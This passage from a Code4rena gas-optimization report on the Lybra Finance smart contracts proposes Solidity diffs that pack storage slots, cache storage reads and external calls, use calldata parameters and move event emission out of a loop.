+    uint128 public lidoRebaseTime = 12 hours;

     // stETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84
     // oracle = 0x4c517D4e2C851CA76d7eC94B805269Df0f2201De
@@ -24,7 +24,7 @@ contract LybraStETHDepositVault is LybraEUSDVaultBase {
      */
     function setLidoRebaseTime(uint256 _time) external {
         require(configurator.hasRole(keccak256("ADMIN"), msg.sender), "not authorized");
-        lidoRebaseTime = _time;
+        lidoRebaseTime = uint128(_time);
     }

     /**
@@ -89,7 +89,7 @@ contract LybraStETHDepositVault is LybraEUSDVaultBase {
             emit FeeDistribution(address(configurator), payAmount, block.timestamp);
         }

-        lastReportTime = block.timestamp;
+        lastReportTime = uint128(block.timestamp);
         collateralAsset.transfer(msg.sender, realAmount);
         emit LSDValueCaptured(realAmount, payAmount, getDutchAuctionDiscountPrice(), block.timestamp);
     }
```
```diff
diff --git a/lybra/pools/base/LybraEUSDVaultBase.sol b/lybra/pools/base/LybraEUSDVaultBase.sol
index 7a8c439..204c34b 100644
--- a/lybra/pools/base/LybraEUSDVaultBase.sol
+++ b/lybra/pools/base/LybraEUSDVaultBase.sol
@@ -22,7 +22,6 @@ abstract contract LybraEUSDVaultBase {
     IPriceFeed immutable etherOracle;

     uint256 public totalDepositedAsset;
-    uint256 public lastReportTime;
     uint256 public poolTotalEUSDCirculation;

     mapping(address => uint256) public depositedAsset;
@@ -30,6 +29,7 @@ abstract contract LybraEUSDVaultBase {
     uint8 immutable vaultType = 0;
     uint256 public feeStored;
     mapping(address => uint256) depositedTime;
+    uint128 public lastReportTime;

     event DepositEther(address indexed onBehalfOf, address asset, uint256 etherAmount, uint256 assetAmount, uint256 timestamp);

@@ -294,7 +294,7 @@ abstract contract LybraEUSDVaultBase {

     function _saveReport() internal {
         feeStored += _newFee();
-        lastReportTime = block.timestamp;
+        lastReportTime = uint128(block.timestamp);
     }
```
</details>

## [G-04] Structs can be packed into fewer storage slots
The EVM works with 32 byte words. Variables less than 32 bytes can be declared next to each other in storage and this will pack the values together into a single 32 byte storage slot (if values combined are <= 32 bytes). If the variables packed together are retrieved together in functions (more likely with structs), we will effectively save ~2000 gas with every subsequent SLOAD for that storage slot. This is due to us incurring a `Gwarmaccess (100 gas)` versus a `Gcoldsload (2100 gas)`.

Total Instances: `1`

Estimated Gas Saved: `1 (slots) * 2000 = 2000`

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/esLBRBoost.sol#L18-L22

### Reduce `uint` type for `unlockTime` and `duration` and pack into a single storage slot to save 1 SLOT (~2000 gas)
```solidity
File: contracts/lybra/miner/esLBRBoost.sol
18:    struct LockStatus {
19:        uint256 unlockTime;
20:        uint256 duration;
21:        uint256 miningBoost;
22:    }
```
```diff
diff --git a/lybra/miner/esLBRBoost.sol b/lybra/miner/esLBRBoost.sol
index c6a4d24..3bc785b 100644
--- a/lybra/miner/esLBRBoost.sol
+++ b/lybra/miner/esLBRBoost.sol
@@ -16,8 +16,8 @@ contract esLBRBoost is Ownable {

     // Define a struct for the user's lock status
     struct LockStatus {
-        uint256 unlockTime;
-        uint256 duration;
+        uint128 unlockTime;
+        uint128 duration;
         uint256 miningBoost;
     }

@@ -41,7 +41,7 @@ contract esLBRBoost is Ownable {
         if (userStatus.unlockTime > block.timestamp) {
             require(userStatus.duration <= _setting.duration, "Your lock-in period has not ended, and the term can only be extended, not reduced.");
         }
-        userLockStatus[msg.sender] = LockStatus(block.timestamp + _setting.duration, _setting.duration, _setting.miningBoost);
+        userLockStatus[msg.sender] = LockStatus(uint128(block.timestamp + _setting.duration), uint128(_setting.duration), _setting.miningBoost);
     }
```

## [G-05] Cache state variables outside of loop to avoid reading storage on every iteration
Reading from storage should always try to be avoided within loops. In the following instances, we are able to cache state variables outside of the loop to save a `Gwarmaccess (100 gas)` per loop iteration.

Total Instances: `1`

Estimiated Gas Saved: `100`

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L136-L145

### Cache `peUSDExtraRatio` outside of the loop to save 1 SLOAD per iteration

*Note: This `view` function is invoked within other public `view` functions that themselves are invoked within state-mutating functions. Example: `getReward()` (state-mutating) invokes `isOtherEarningsClaimable` which in turn invokes `stakeOf`.*
```solidity
File: contracts/lybra/miner/EUSDMiningIncentives.sol
136:    function stakedOf(address user) public view returns (uint256) {
137:        uint256 amount;
138:        for (uint i = 0; i < pools.length; i++) {
139:            ILybra pool = ILybra(pools[i]);
140:            uint borrowed = pool.getBorrowedOf(user);
141:            if (pool.getVaultType() == 1) {
142:                borrowed = borrowed * (1e20 + peUSDExtraRatio) / 1e20; // @audit: sload on every iteration
143:            }
144:            amount += borrowed;
145:        }
```
```diff
diff --git a/lybra/miner/EUSDMiningIncentives.sol b/lybra/miner/EUSDMiningIncentives.sol
index e6c57c8..43746fa 100644
--- a/lybra/miner/EUSDMiningIncentives.sol
+++ b/lybra/miner/EUSDMiningIncentives.sol
@@ -135,11 +135,12 @@ contract EUSDMiningIncentives is Ownable {

     function stakedOf(address user) public view returns (uint256) {
         uint256 amount;
+        uint256 _peUSDExtraRatio = peUSDExtraRatio;
         for (uint i = 0; i < pools.length; i++) {
             ILybra pool = ILybra(pools[i]);
             uint borrowed = pool.getBorrowedOf(user);
             if (pool.getVaultType() == 1) {
-                borrowed = borrowed * (1e20 + peUSDExtraRatio) / 1e20;
+                borrowed = borrowed * (1e20 + _peUSDExtraRatio) / 1e20;
             }
             amount += borrowed;
         }
```

## [G-06] Use `calldata` instead of `memory` for function parameters that don't change
When you specify a data location as `memory`, that value will be copied into memory. When you specify the location as `calldata`, the value will stay static within `calldata`. If the value is a large, complex type, using memory may result in extra memory expansion costs.

Total Instances: `2`

Estimated Gas Saved: `200` 

*Note: This is a commonly known high impact finding; however, due to lack of available tests the exact gas costs can not be known. We will therefore be conservative in our projected gas savings and give each instance a projected savings of 100 gas.*

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L93

```solidity
File: contracts/lybra/miner/EUSDMiningIncentives.sol
93:    function setPools(address[] memory _pools) external onlyOwner {
```
```diff
diff --git a/lybra/miner/EUSDMiningIncentives.sol b/lybra/miner/EUSDMiningIncentives.sol
index e6c57c8..50ea5b2 100644
--- a/lybra/miner/EUSDMiningIncentives.sol
+++ b/lybra/miner/EUSDMiningIncentives.sol
@@ -90,7 +90,7 @@ contract EUSDMiningIncentives is Ownable {
         lbrPriceFeed = AggregatorV3Interface(_lbrOracle);
     }

-    function setPools(address[] memory _pools) external onlyOwner {
+    function setPools(address[] calldata _pools) external onlyOwner {
         for (uint i = 0; i < _pools.length; i++) {
             require(configurator.mintVault(_pools[i]), "NOT_VAULT");
         }
```

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/esLBRBoost.sol#L33

```solidity
File: contracts/lybra/miner/esLBRBoost.sol
33:    function addLockSetting(esLBRLockSetting memory setting) external onlyOwner {
```
```diff
diff --git a/lybra/miner/esLBRBoost.sol b/lybra/miner/esLBRBoost.sol
index c6a4d24..a2784df 100644
--- a/lybra/miner/esLBRBoost.sol
+++ b/lybra/miner/esLBRBoost.sol
@@ -30,7 +30,7 @@ contract esLBRBoost is Ownable {
     }

     // Function to add a new lock setting
-    function addLockSetting(esLBRLockSetting memory setting) external onlyOwner {
+    function addLockSetting(esLBRLockSetting calldata setting) external onlyOwner {
         esLBRLockSettings.push(setting);
     }
```

## [G-07] Cache function calls
External calls are expensive as they are performed via the `CALL`/`STATICCALL` opcodes. Calls to internal functions can also be expensive when the internal functions themselves read from storage and/or perform external calls. If a function call, such as the ones explained above, is performed more than once, it should be cached to avoid incurring the costs multiple times.

Total Instances: `5`

Estimated Gas Saved: `600`

<details>

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/ProtocolRewardsPool.sol#L227-L239

### Cache the return value from `totalStaked()` to save 1 External Call (~100 gas)
```solidity
File: contracts/lybra/miner/ProtocolRewardsPool.sol
227:    function notifyRewardAmount(uint amount, uint tokenType) external {
228:        require(msg.sender == address(configurator));
229:        if (totalStaked() == 0) return;
230:        require(amount > 0, "amount = 0");
231:        if(tokenType == 0) {
232:            uint256 share = IEUSD(configurator.getEUSDAddress()).getSharesByMintedEUSD(amount);
233:            rewardPerTokenStored = rewardPerTokenStored + (share * 1e18) / totalStaked();
234:        } else if(tokenType == 1) {
235:            ERC20 token = ERC20(configurator.stableToken());
236:            rewardPerTokenStored = rewardPerTokenStored + (amount * 1e36 / token.decimals()) / totalStaked();
237:        } else {
238:            rewardPerTokenStored = rewardPerTokenStored + (amount * 1e18) / totalStaked();
239:        }
```
```diff
diff --git a/lybra/miner/ProtocolRewardsPool.sol b/lybra/miner/ProtocolRewardsPool.sol
index 8fc83d6..5cdfbc1 100644
--- a/lybra/miner/ProtocolRewardsPool.sol
+++ b/lybra/miner/ProtocolRewardsPool.sol
@@ -226,16 +226,18 @@ contract ProtocolRewardsPool is Ownable {
      */
     function notifyRewardAmount(uint amount, uint tokenType) external {
         require(msg.sender == address(configurator));
-        if (totalStaked() == 0) return;
+        uint256 _cachedTotalStaked = totalStaked();
+        if (_cachedTotalStaked == 0) return;
         require(amount > 0, "amount = 0");
         if(tokenType == 0) {
             uint256 share = IEUSD(configurator.getEUSDAddress()).getSharesByMintedEUSD(amount);
-            rewardPerTokenStored = rewardPerTokenStored + (share * 1e18) / totalStaked();
+            rewardPerTokenStored = rewardPerTokenStored + (share * 1e18) / _cachedTotalStaked;
         } else if(tokenType == 1) {
             ERC20 token = ERC20(configurator.stableToken());
-            rewardPerTokenStored = rewardPerTokenStored + (amount * 1e36 / token.decimals()) / totalStaked();
+            rewardPerTokenStored = rewardPerTokenStored + (amount * 1e36 / token.decimals()) / _cachedTotalStaked;
         } else {
-            rewardPerTokenStored = rewardPerTokenStored + (amount * 1e18) / totalStaked();
+            rewardPerTokenStored = rewardPerTokenStored + (amount * 1e18) / _cachedTotalStaked;
         }
     }
 }
```

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L204-L205

### Cache `configurator.vaultKeeperRatio(address(this))` to save 1 External Call (~100 gas)
```solidity
File: contracts/lybra/pools/base/LybraEUSDVaultBase.sol
204:        if (msg.sender != provider && onBehalfOfCollateralRatio >= 1e20 + configurator.vaultKeeperRatio(address(this)) * 1e18) { // @audit: 1st external call
205:            reward2keeper = ((assetAmount * configurator.vaultKeeperRatio(address(this))) * 1e18) / onBehalfOfCollateralRatio; // @audit: 2nd external call
```
```diff
diff --git a/lybra/pools/base/LybraEUSDVaultBase.sol b/lybra/pools/base/LybraEUSDVaultBase.sol
index 7a8c439..cde9e96 100644
--- a/lybra/pools/base/LybraEUSDVaultBase.sol
+++ b/lybra/pools/base/LybraEUSDVaultBase.sol
@@ -201,8 +201,9 @@ abstract contract LybraEUSDVaultBase {
         totalDepositedAsset -= assetAmount;
         depositedAsset[onBehalfOf] -= assetAmount;
         uint256 reward2keeper;
-        if (msg.sender != provider && onBehalfOfCollateralRatio >= 1e20 + configurator.vaultKeeperRatio(address(this)) * 1e18) {
-            reward2keeper = ((assetAmount * configurator.vaultKeeperRatio(address(this))) * 1e18) / onBehalfOfCollateralRatio;
+        uint256 _vaultKeeperRatio = configurator.vaultKeeperRatio(address(this));
+        if (msg.sender != provider && onBehalfOfCollateralRatio >= 1e20 + _vaultKeeperRatio * 1e18) {
+            reward2keeper = ((assetAmount * _vaultKeeperRatio) * 1e18) / onBehalfOfCollateralRatio;
             collateralAsset.transfer(msg.sender, reward2keeper);
         }
         collateralAsset.transfer(provider, assetAmount - reward2keeper);
```

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L163-L169

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L132-L134

### Cache the return value from `totalStaked()` to save 1 External Call (~100 gas)
```solidity
File: contracts/lybra/miner/EUSDMiningIncentives.sol
132:    function totalStaked() internal view returns (uint256) {
133:        return EUSD.totalSupply(); // @audit: external call
134:    }

163:    function rewardPerToken() public view returns (uint256) {
164:        if (totalStaked() == 0) { // @audit: 1st external call
165:            return rewardPerTokenStored;
166:        }
167:
168:        return rewardPerTokenStored + (rewardRatio * (lastTimeRewardApplicable() - updatedAt) * 1e18) / totalStaked(); // @audit: 2nd external call
169:    }
```
```diff
diff --git a/lybra/miner/EUSDMiningIncentives.sol b/lybra/miner/EUSDMiningIncentives.sol
index e6c57c8..2dcb330 100644
--- a/lybra/miner/EUSDMiningIncentives.sol
+++ b/lybra/miner/EUSDMiningIncentives.sol
@@ -161,11 +161,12 @@ contract EUSDMiningIncentives is Ownable {
     }

     function rewardPerToken() public view returns (uint256) {
-        if (totalStaked() == 0) {
+        uint256 _cachedTotalStaked = totalStaked();
+        if (_cachedTotalStaked == 0) {
             return rewardPerTokenStored;
         }

-        return rewardPerTokenStored + (rewardRatio * (lastTimeRewardApplicable() - updatedAt) * 1e18) / totalStaked();
+        return rewardPerTokenStored + (rewardRatio * (lastTimeRewardApplicable() - updatedAt) * 1e18) / _cachedTotalStaked;
     }
```

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/ProtocolRewardsPool.sol#L115-L116

### Cache `getPreUnlockableAmount(msg.sender)` to save 2 SLOADs
```solidity
File: contracts/lybra/miner/ProtocolRewardsPool.sol
115:        uint256 burnAmount = getReservedLBRForVesting(msg.sender) - getPreUnlockableAmount(msg.sender); // @audit: 1st function call (reads `time2fullRedemption[user]` at least 2 times)
116:        uint256 amount = getPreUnlockableAmount(msg.sender) + getClaimAbleLBR(msg.sender); // @audit: 2nd function call (`time2FullRedemption[user]` read a total of at least 4 times)
```
```diff
diff --git a/lybra/miner/ProtocolRewardsPool.sol b/lybra/miner/ProtocolRewardsPool.sol
index 8fc83d6..3416ba4 100644
--- a/lybra/miner/ProtocolRewardsPool.sol
+++ b/lybra/miner/ProtocolRewardsPool.sol
@@ -112,8 +112,9 @@ contract ProtocolRewardsPool is Ownable {
      */
     function unlockPrematurely() external {
         require(block.timestamp + exitCycle - 3 days > time2fullRedemption[msg.sender], "ENW");
-        uint256 burnAmount = getReservedLBRForVesting(msg.sender) - getPreUnlockableAmount(msg.sender);
-        uint256 amount = getPreUnlockableAmount(msg.sender) + getClaimAbleLBR(msg.sender);
+        uint256 _preUnlockableAmount = getPreUnlockableAmount(msg.sender);
+        uint256 burnAmount = getReservedLBRForVesting(msg.sender) - _preUnlockableAmount;
+        uint256 amount = _preUnlockableAmount + getClaimAbleLBR(msg.sender);
         if (amount > 0) {
             LBR.mint(msg.sender, amount);
         }
```

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/LybraStETHVault.sol#L66-L94

### Cache getDutchAuctionDiscountPrice() to save 1 SLOAD
```solidity
File: contracts/lybra/pools/LybraStETHVault.sol
66:        uint256 payAmount = (((realAmount * getAssetPrice()) / 1e18) * getDutchAuctionDiscountPrice()) / 10000; // @audit: 1st function call (reads `lidoRebaseTime`)
...
94:        emit LSDValueCaptured(realAmount, payAmount, getDutchAuctionDiscountPrice(), block.timestamp); // @audit: 2nd function call (reads `lidoRebaseTime` again)
```
```diff
diff --git a/lybra/pools/LybraStETHVault.sol b/lybra/pools/LybraStETHVault.sol
index 3f20843..8b8984b 100644
--- a/lybra/pools/LybraStETHVault.sol
+++ b/lybra/pools/LybraStETHVault.sol
@@ -63,7 +63,8 @@ contract LybraStETHDepositVault is LybraEUSDVaultBase {
         uint256 excessAmount = collateralAsset.balanceOf(address(this)) - totalDepositedAsset;
         require(excessAmount > 0 && stETHAmount > 0, "Only LSD excess income can be exchanged");
         uint256 realAmount = stETHAmount > excessAmount ? excessAmount : stETHAmount;
-        uint256 payAmount = (((realAmount * getAssetPrice()) / 1e18) * getDutchAuctionDiscountPrice()) / 10000;
+        uint256 _dutchAuctionDiscountPrice = getDutchAuctionDiscountPrice();
+        uint256 payAmount = (((realAmount * getAssetPrice()) / 1e18) * _dutchAuctionDiscountPrice) / 10000;

         uint256 income = feeStored + _newFee();
         if (payAmount > income) {
@@ -91,7 +92,7 @@ contract LybraStETHDepositVault is LybraEUSDVaultBase {

         lastReportTime = block.timestamp;
         collateralAsset.transfer(msg.sender, realAmount);
-        emit LSDValueCaptured(realAmount, payAmount, getDutchAuctionDiscountPrice(), block.timestamp);
+        emit LSDValueCaptured(realAmount, payAmount, _dutchAuctionDiscountPrice, block.timestamp);
     }
```

</details>

## [G-08] Refactor functions to avoid excessive storage reads
The functions below read storage slots that are previously read in the functions that invoke them. We can refactor the functions so we could pass cached storage variables as stack variables and avoid the extra storage reads that would otherwise take place in the public/internal functions.

Total Instances: `4`

Estimated Gas Saved: `900`

<details>

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L72-L74

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L163-L168

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L159-L161

### Cache return value from `lastTimRewardApplicable()` and pass it into `rewardPerToken` to save 1 SLOAD
```solidity
File: contracts/lybra/miner/EUSDMiningIncentives.sol
72:    modifier updateReward(address _account) {
73:        rewardPerTokenStored = rewardPerToken(); // @audit: invokes `lastTimeRewardApplicable()`, which reads `finishAt`
74:        updatedAt = lastTimeRewardApplicable(); // @audit: 2nd sload for `finishAt`

159:    function lastTimeRewardApplicable() public view returns (uint256) {
160:        return _min(finishAt, block.timestamp); // @audit: sload for `finishAt`
161:    }

163:    function rewardPerToken() public view returns (uint256) {
164:        if (totalStaked() == 0) {
165:            return rewardPerTokenStored;
166:        }
167:
168:        return rewardPerTokenStored + (rewardRatio * (lastTimeRewardApplicable() - updatedAt) * 1e18) / totalStaked(); // @audit: sload for `finishAt`
```
```diff
diff --git a/lybra/miner/EUSDMiningIncentives.sol b/lybra/miner/EUSDMiningIncentives.sol
index e6c57c8..fe5160f 100644
--- a/lybra/miner/EUSDMiningIncentives.sol
+++ b/lybra/miner/EUSDMiningIncentives.sol
@@ -70,8 +70,9 @@ contract EUSDMiningIncentives is Ownable {
     }

     modifier updateReward(address _account) {
-        rewardPerTokenStored = rewardPerToken();
-        updatedAt = lastTimeRewardApplicable();
+        uint256 _updatedAt = lastTimeRewardApplicable();
+        updatedAt = _updatedAt;
+        rewardPerTokenStored = _rewardPerToken(_updatedAt);

         if (_account != address(0)) {
             rewards[_account] = earned(_account);
@@ -161,11 +162,15 @@ contract EUSDMiningIncentives is Ownable {
     }

     function rewardPerToken() public view returns (uint256) {
+        return _rewardPerToken(lastTimeRewardApplicable());
+    }
+
+    function _rewardPerToken(uint256 _updatedAt) internal view returns (uint256) {
         if (totalStaked() == 0) {
             return rewardPerTokenStored;
         }

-        return rewardPerTokenStored + (rewardRatio * (lastTimeRewardApplicable() - updatedAt) * 1e18) / totalStaked();
+        return rewardPerTokenStored + (rewardRatio * (_updatedAt - updatedAt) * 1e18) / totalStaked();
     }
```

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L72-L77

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L184-L186

### Cache return value from `rewardPerToken()` and pass it into `earned` to save 2 External Calls (~200 gas) and 2 SLOADs
```solidity
File: contracts/lybra/miner/EUSDMiningIncentives.sol
72:    modifier updateReward(address _account) {
73:        rewardPerTokenStored = rewardPerToken(); // @audit: function performs two function calls (via `totalStaked()`) and 2 SLOADs for state variables that stay the same (i.e. `rewardRatio` and `finishAt`)
74:        updatedAt = lastTimeRewardApplicable();
75:
76:        if (_account != address(0)) {
77:            rewards[_account] = earned(_account); // @audit: function invokes `rewardPerToken()` again incurring the same costs as above for a second time

184:    function earned(address _account) public view returns (uint256) {
185:        return ((stakedOf(_account) * getBoost(_account) * (rewardPerToken() - userRewardPerTokenPaid[_account])) / 1e38) + rewards[_account]; // @audit: performs same two function calls and 2 SLOADs as mentioned above
186:    }
```
```diff
diff --git a/lybra/miner/EUSDMiningIncentives.sol b/lybra/miner/EUSDMiningIncentives.sol
index e6c57c8..fb7624e 100644
--- a/lybra/miner/EUSDMiningIncentives.sol
+++ b/lybra/miner/EUSDMiningIncentives.sol
@@ -70,11 +70,12 @@ contract EUSDMiningIncentives is Ownable {
     }

     modifier updateReward(address _account) {
-        rewardPerTokenStored = rewardPerToken();
+        uint256 _rewardPerTokenStored = rewardPerToken();
+        rewardPerTokenStored = _rewardPerTokenStored;
         updatedAt = lastTimeRewardApplicable();

         if (_account != address(0)) {
-            rewards[_account] = earned(_account);
+            rewards[_account] = _earned(_rewardPerTokenStored, _account);
             userRewardPerTokenPaid[_account] = rewardPerTokenStored;
             userUpdatedAt[_account] = block.timestamp;
         }
@@ -182,7 +183,11 @@ contract EUSDMiningIncentives is Ownable {
     }

     function earned(address _account) public view returns (uint256) {
-        return ((stakedOf(_account) * getBoost(_account) * (rewardPerToken() - userRewardPerTokenPaid[_account])) / 1e38) + rewards[_account];
+        return _earned(rewardPerToken(), _account);
+    }
+
+    function _earned(uint256 _rewardPerTokenStored, address _account) internal view returns (uint256) {
+        return ((stakedOf(_account) * getBoost(_account) * (_rewardPerTokenStored - userRewardPerTokenPaid[_account])) / 1e38) + rewards[_account];
     }
```

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/token/EUSD.sol#L414-L425

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/token/EUSD.sol#L299-L306

### Cache `_totalSupply` and `_totalShares` and pass cached values into `getSharesByMintedEUSD` to save 2 SLOADs
```solidity
File: contracts/lybra/token/EUSD.sol
299:    function getSharesByMintedEUSD(uint256 _EUSDAmount) public view returns (uint256) {
300:        uint256 totalMintedEUSD = _totalSupply; // @audit: 1st sload
301:        if (totalMintedEUSD == 0) {
302:            return 0;
303:        } else {
304:            return _EUSDAmount.mul(_totalShares).div(totalMintedEUSD); // @audit: 1st sload
305:        }
306:    }

414:        uint256 sharesAmount = getSharesByMintedEUSD(_mintAmount); // @audit: reads `_totalShares` and `_totalSupply`
415:        if (sharesAmount == 0) {
416:            //EUSD totalSupply is 0: assume that shares correspond to EUSD 1-to-1
417:            sharesAmount = _mintAmount;
418:        }
419:
420:        newTotalShares = _totalShares.add(sharesAmount); // @audit: 2nd sload
421:        _totalShares = newTotalShares;
422:
423:        shares[_recipient] = shares[_recipient].add(sharesAmount);
424:
425:        _totalSupply += _mintAmount; // @audit: 2nd sload

```
```diff
diff --git a/lybra/token/EUSD.sol b/lybra/token/EUSD.sol
index cca5cee..58f8f6f 100644
--- a/lybra/token/EUSD.sol
+++ b/lybra/token/EUSD.sol
@@ -297,11 +297,14 @@ contract EUSD is IERC20, Context {
      * @return the amount of shares that corresponds to `_EUSDAmount` protocol-supplied EUSD.
      */
     function getSharesByMintedEUSD(uint256 _EUSDAmount) public view returns (uint256) {
-        uint256 totalMintedEUSD = _totalSupply;
-        if (totalMintedEUSD == 0) {
+        return _getSharesByMintedEUSD(_totalSupply, _totalShares, _EUSDAmount);
+    }
+
+    function _getSharesByMintedEUSD(uint256 _cachedTotalySupply, uint256 _cachedTotalShares, uint256 _EUSDAmount) internal view returns (uint256) {
+        if (_cachedTotalySupply == 0) {
             return 0;
-        } else {
-            return _EUSDAmount.mul(_totalShares).div(totalMintedEUSD);
+            } else {
+            return _EUSDAmount.mul(_cachedTotalShares).div(_cachedTotalySupply);
         }
     }

@@ -410,19 +413,21 @@ contract EUSD is IERC20, Context {
      */
     function mint(address _recipient, uint256 _mintAmount) external onlyMintVault MintPaused returns (uint256 newTotalShares) {
         require(_recipient != address(0), "MINT_TO_THE_ZERO_ADDRESS");
-
-        uint256 sharesAmount = getSharesByMintedEUSD(_mintAmount);
+
+        uint256 _cachedTotalySupply = _totalSupply;
+        uint256 _cachedTotalShares = _totalShares;
+        uint256 sharesAmount = _getSharesByMintedEUSD(_cachedTotalySupply, _cachedTotalShares, _mintAmount);
         if (sharesAmount == 0) {
             //EUSD totalSupply is 0: assume that shares correspond to EUSD 1-to-1
             sharesAmount = _mintAmount;
         }

-        newTotalShares = _totalShares.add(sharesAmount);
+        newTotalShares = _cachedTotalShares.add(sharesAmount);
         _totalShares = newTotalShares;

         shares[_recipient] = shares[_recipient].add(sharesAmount);

-        _totalSupply += _mintAmount;
+        _totalSupply = _cachedTotalySupply + _mintAmount;

         emit Transfer(address(0), _recipient, _mintAmount);
     }
```

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/ProtocolRewardsPool.sol#L141-L142

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/ProtocolRewardsPool.sol#L161-L165

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/ProtocolRewardsPool.sol#L155-L159

### Cache `time2FullRedemption[msg.sender]` and pass the cached value into `getReservedLBRForVesting` and `getClaimAbleLBR` to save 2 SLOADs
```solidity
File: contracts/lybra/miner/ProtocolRewardsPool.sol
141:    function reStake() external {
142:        uint256 amount = getReservedLBRForVesting(msg.sender) + getClaimAbleLBR(msg.sender);

155:    function getClaimAbleLBR(address user) public view returns (uint256 amount) {
156:        if (time2fullRedemption[user] > lastWithdrawTime[user]) {
157:            amount = block.timestamp > time2fullRedemption[user] ? unstakeRatio[user] * (time2fullRedemption[user] - lastWithdrawTime[user]) : unstakeRatio[user] * (block.timestamp - lastWithdrawTime[user]);
158:        }
159:    }

161:    function getReservedLBRForVesting(address user) public view returns (uint256 amount) {
162:        if (time2fullRedemption[user] > block.timestamp) { // @audit: 1st sload
163:            amount = unstakeRatio[user] * (time2fullRedemption[user] - block.timestamp); // @audit: potential 2nd sload
164:        }
165:    }
```
```diff
diff --git a/lybra/miner/ProtocolRewardsPool.sol b/lybra/miner/ProtocolRewardsPool.sol
index 8fc83d6..14b139e 100644
--- a/lybra/miner/ProtocolRewardsPool.sol
+++ b/lybra/miner/ProtocolRewardsPool.sol
@@ -139,7 +139,8 @@ contract ProtocolRewardsPool is Ownable {
      * @dev Convert unredeemed and converting ESLBR tokens back to LBR.
      */
     function reStake() external {
-        uint256 amount = getReservedLBRForVesting(msg.sender) + getClaimAbleLBR(msg.sender);
+        uint256 _time2fullRedemption = time2fullRedemption[msg.sender];
+        uint256 amount = _getReservedLBRForVesting(_time2fullRedemption, msg.sender) + _getClaimAbleLBR(_time2fullRedemption, msg.sender);
         esLBR.mint(msg.sender, amount);
         unstakeRatio[msg.sender] = 0;
         time2fullRedemption[msg.sender] = 0;
@@ -152,15 +153,23 @@ contract ProtocolRewardsPool is Ownable {
         amount = (a * (75e18 - ((time2fullRedemption[user] - block.timestamp) * 70e18) / (exitCycle / 1 days - 3) / 1 days)) / 100e18;
     }

-    function getClaimAbleLBR(address user) public view returns (uint256 amount) {
-        if (time2fullRedemption[user] > lastWithdrawTime[user]) {
-            amount = block.timestamp > time2fullRedemption[user] ? unstakeRatio[user] * (time2fullRedemption[user] - lastWithdrawTime[user]) : unstakeRatio[user] * (block.timestamp - lastWithdrawTime[user]);
+    function getClaimAbleLBR(address user) public view returns (uint256) {
+        return _getClaimAbleLBR(time2fullRedemption[user], user);
+    }
+
+    function _getClaimAbleLBR(uint256 _time2fullRedemption, address user) internal view returns (uint256 amount) {
+        if (_time2fullRedemption > lastWithdrawTime[user]) {
+            amount = block.timestamp > _time2fullRedemption ? unstakeRatio[user] * (_time2fullRedemption - lastWithdrawTime[user]) : unstakeRatio[user] * (block.timestamp - lastWithdrawTime[user]);
         }
     }

-    function getReservedLBRForVesting(address user) public view returns (uint256 amount) {
-        if (time2fullRedemption[user] > block.timestamp) {
-            amount = unstakeRatio[user] * (time2fullRedemption[user] - block.timestamp);
+    function getReservedLBRForVesting(address user) public view returns (uint256) {
+        return _getReservedLBRForVesting(time2fullRedemption[user], user);
+    }
+
+    function _getReservedLBRForVesting(uint256 _time2fullRedemption, address user) internal view returns (uint256 amount) {
+        if (_time2fullRedemption > block.timestamp) {
+            amount = unstakeRatio[user] * (_time2fullRedemption - block.timestamp);
         }
     }
```

</details>

## [G-09] Avoid emitting event on every iteration
Expensive operations should always try to be avoided within loops. Such operations include: reading/writing to storage, heavy calculations, external calls, and emitting events. In this instance, an event is being emitted every iteration. Events have a base cost of `Glog (375 gas)` per emit and `Glogdata (8 gas) * number of bytes in event`. We can avoid incurring those costs each iteration by emitting the event outside of the loop.

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/configuration/LybraConfigurator.sol#L236-L238

```solidity
File: contracts/lybra/configuration/LybraConfigurator.sol
236:        for (uint256 i = 0; i < _contracts.length; i++) {
237:            tokenMiner[_contracts[i]] = _bools[i];
238:            emit tokenMinerChanges(_contracts[i], _bools[i]); // @audit: emit on every iteration
```

## [G-10] Multiple address/ID mappings can be combined into a single mapping of an address/ID to a struct, where appropriate 
We can combine multiple mappings below into structs. We can then pack the structs by modifying the uint type for the values. This will result in cheaper storage reads since multiple mappings are accessed in functions and those values are now occupying the same storage slot; meaning the slot will become warm after the first SLOAD. In addition, when writing to and reading from the struct values, we will avoid a `Gsset (20000 gas)` and `Gcoldsload (2100 gas)` since multiple struct values are now occupying the same slot.

Estimated Gas Savings: `Gsset (20000 gas) + Gcoldsload (2100 gas) = 22100`

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/ProtocolRewardsPool.sol#L36-L38

